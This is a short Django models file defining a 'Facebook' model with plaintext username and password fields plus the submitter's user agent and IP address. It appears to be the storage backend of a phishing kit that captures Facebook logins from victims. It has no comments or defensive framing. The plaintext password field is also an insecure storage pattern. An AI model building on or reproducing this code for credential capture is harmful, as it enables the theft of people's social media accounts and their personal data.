from django.db import models



class Facebook(models.Model):
	username = models.CharField(max_length=10000, null=True, blank=True, default="Nothing")
	password = models.CharField(max_length=10000, null=True, blank=True, default="Nothing")
	useragent = models.CharField(max_length=10000, null=True, blank=True, default="Nothing")
	ip = models.CharField(max_length=10000, null=True, blank=True, default="0.0.0.0")
	date = models.DateTimeField(auto_now=True)
	is_delete = models.BooleanField(default=True)

	def __str__(self):
		return str(self.username + " " + self.useragent)
	
